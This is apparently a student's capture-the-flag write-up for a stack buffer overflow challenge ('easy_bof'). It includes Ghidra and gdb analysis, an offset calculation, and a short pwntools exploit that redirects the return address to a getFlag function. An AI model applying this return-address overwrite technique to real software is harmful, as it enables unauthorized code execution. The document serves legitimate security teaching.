judging from the description, that gives me the dimensions of the buffer, i concur that i must perform a buffer overflow.

i used ghidra to understand the inner workings of the binary and to look for hidden functions.
i saw that the buffer is 16 char wide and that there's a "getFlag" function that i might want to execute, so the return address of main() must be overwritten with the address of "getFlag".

i used gdb to see the dimensions of the stack in order to undestand how much "padding" to send to write the "getFlag" address in the correct place

```
gef➤  disass main
Dump of assembler code for function main:
   0x000000000040064e <+0>:	push   rbp
   0x000000000040064f <+1>:	mov    rbp,rsp
   0x0000000000400652 <+4>:	sub    rsp,0x20
   0x0000000000400656 <+8>:	mov    DWORD PTR [rbp-0x4],0x0
   0x000000000040065d <+15>:	lea    rdi,[rip+0xe0]        # 0x400744
   0x0000000000400664 <+22>:	call   0x4004a0 <puts@plt>
   0x0000000000400669 <+27>:	lea    rax,[rbp-0x20]
   0x000000000040066d <+31>:	mov    rdi,rax
   0x0000000000400670 <+34>:	mov    eax,0x0
   0x0000000000400675 <+39>:	call   0x4004c0 <gets@plt>
   0x000000000040067a <+44>:	lea    rax,[rbp-0x20]
   0x000000000040067e <+48>:	lea    rsi,[rip+0xd5]        # 0x40075a
   0x0000000000400685 <+55>:	mov    rdi,rax
   0x0000000000400688 <+58>:	call   0x4004b0 <strcmp@plt>
   0x000000000040068d <+63>:	test   eax,eax
   0x000000000040068f <+65>:	je     0x40069f <main+81>
   0x0000000000400691 <+67>:	lea    rdi,[rip+0xcf]        # 0x400767
   0x0000000000400698 <+74>:	call   0x4004a0 <puts@plt>
   0x000000000040069d <+79>:	jmp    0x4006ab <main+93>
   0x000000000040069f <+81>:	lea    rdi,[rip+0xd2]        # 0x400778
   0x00000000004006a6 <+88>:	call   0x4004a0 <puts@plt>
   0x00000000004006ab <+93>:	mov    eax,0x0
   0x00000000004006b0 <+98>:	leave  
   0x00000000004006b1 <+99>:	ret    
End of assembler dump.
gef➤  b*0x00000000004006ab
Breakpoint 1 at 0x4006ab: file bof.c, line 34.
gef➤  r
Starting program: /home/locale/2017/cyber053/students/easy_bof/easy_bof 
Enter the password : 
AAAAAAAAAAAAAAAA

Wrong Password 

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x11              
$rbx   : 0x0               
$rcx   : 0x00007ffff7af2104  →  0x5477fffff0003d48 ("H="?)
$rdx   : 0x00007ffff7dcf8c0  →  0x0000000000000000
$rsp   : 0x00007fffffffe100  →  "AAAAAAAAAAAAAAAA"
$rbp   : 0x00007fffffffe120  →  0x00000000004006c0  →  <__libc_csu_init+0> push r15
$rsi   : 0x0000000000602260  →  "Wrong Password \nrd : \n"
$rdi   : 0x1               
$rip   : 0x00000000004006ab  →  <main+93> mov eax, 0x0
$r8    : 0x0               
$r9    : 0x00007ffff7fb64c0  →  0x00007ffff7fb64c0  →  [loop detected]
$r10   : 0x3               
$r11   : 0x246             
$r12   : 0x00000000004004e0  →  <_start+0> xor ebp, ebp
$r13   : 0x00007fffffffe200  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe100│+0x0000: "AAAAAAAAAAAAAAAA"	 ← $rsp
0x00007fffffffe108│+0x0008: "AAAAAAAA"
0x00007fffffffe110│+0x0010: 0x00007fffffffe200  →  0x0000000000000001
0x00007fffffffe118│+0x0018: 0x0000000000000000
0x00007fffffffe120│+0x0020: 0x00000000004006c0  →  <__libc_csu_init+0> push r15	 ← $rbp
0x00007fffffffe128│+0x0028: 0x00007ffff7a03c87  →  <__libc_start_main+231> mov edi, eax
0x00007fffffffe130│+0x0030: 0x0000000000000001
0x00007fffffffe138│+0x0038: 0x00007fffffffe208  →  0x00007fffffffe5e3  →  "/home/locale/2017/cyber053/students/easy_bof/easy_[...]"
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40069d <main+79>        jmp    0x4006ab <main+93>
     0x40069f <main+81>        lea    rdi, [rip+0xd2]        # 0x400778
     0x4006a6 <main+88>        call   0x4004a0 <puts@plt>
 →   0x4006ab <main+93>        mov    eax, 0x0
     0x4006b0 <main+98>        leave  
     0x4006b1 <main+99>        ret    
     0x4006b2                  nop    WORD PTR cs:[rax+rax*1+0x0]
     0x4006bc                  nop    DWORD PTR [rax+0x0]
     0x4006c0 <__libc_csu_init+0> push   r15
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "easy_bof", stopped 0x4006ab in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4006ab → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────

Breakpoint 1, main () at bof.c:34
34	bof.c: No such file or directory.
gef➤  info frame
Stack level 0, frame at 0x7fffffffe130:
 rip = 0x4006ab in main (bof.c:34); saved rip = 0x7ffff7a03c87
 source language c.
 Arglist at 0x7fffffffe120, args: 
 Locals at 0x7fffffffe120, Previous frame's sp is 0x7fffffffe130
 Saved registers:
  rbp at 0x7fffffffe120, rip at 0x7fffffffe128
gef➤  x/100x $sp
0x7fffffffe100:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe110:	0xffffe200	0x00007fff	0x00000000	0x00000000
0x7fffffffe120:	0x004006c0	0x00000000	0xf7a03c87	0x00007fff
0x7fffffffe130:	0x00000001	0x00000000	0xffffe208	0x00007fff
0x7fffffffe140:	0x00008000	0x00000001	0x0040064e	0x00000000
0x7fffffffe150:	0x00000000	0x00000000	0x44a809fa	0x532400fc
0x7fffffffe160:	0x004004e0	0x00000000	0xffffe200	0x00007fff
0x7fffffffe170:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe180:	0x8b4809fa	0xacdbff83	0x315609fa	0xacdbef3c
0x7fffffffe190:	0x00000000	0x00007fff	0x00000000	0x00000000
0x7fffffffe1a0:	0x00000000	0x00000000	0xf7de38d3	0x00007fff
0x7fffffffe1b0:	0xf7dc9638	0x00007fff	0x2546309a	0x00000000
0x7fffffffe1c0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe1d0:	0x00000000	0x00000000	0x004004e0	0x00000000
0x7fffffffe1e0:	0xffffe200	0x00007fff	0x0040050a	0x00000000
0x7fffffffe1f0:	0xffffe1f8	0x00007fff	0x0000001c	0x00000000
0x7fffffffe200:	0x00000001	0x00000000	0xffffe5e3	0x00007fff
0x7fffffffe210:	0x00000000	0x00000000	0xffffe619	0x00007fff
0x7fffffffe220:	0xffffe62f	0x00007fff	0xffffe63d	0x00007fff
0x7fffffffe230:	0xffffe660	0x00007fff	0xffffe67b	0x00007fff
0x7fffffffe240:	0xffffe690	0x00007fff	0xffffe6ce	0x00007fff
0x7fffffffe250:	0xffffe6e6	0x00007fff	0xffffe6fd	0x00007fff
0x7fffffffe260:	0xffffe70c	0x00007fff	0xffffe71d	0x00007fff
0x7fffffffe270:	0xffffe728	0x00007fff	0xffffe74e	0x00007fff
0x7fffffffe280:	0xffffe76e	0x00007fff	0xffffe782	0x00007fff
gef➤  
```

so i need to send 24 bytes of padding (i know that the saved rip contains "0x7ffff7a03c87" and i simply counted the blocks from the last "0x41414141" (last A in the buffer) to the rip), after filling the 16 byte buffer.

After decompiling the program i can also see that it prints "correct password" if the first characters of the string equal to "thegeekstuff" but this doens't change the beaviour of the executable and just the first line of the binary's output.
i decided not to include that on the script (out of laziness mostly).

i created a python script to send the correct input:

```python
import pwn

p = pwn.process("./easy_bof")
elf = pwn.ELF("./easy_bof")

p.sendline(b"A"*(16+24)+pwn.p64(elf.symbols["getFlag"]))
p.interactive()
```
the flag is:
```
[*] Process './easy_bof' stopped with exit code 0 (pid 15760)
Enter the password : 

Wrong Password 
Congratz! You win the flag: spritz{bof_for_fun_and_profit?}
```

p.interactive() is needed to display the flag, wihtout it the program's output wasn't displayed correctly
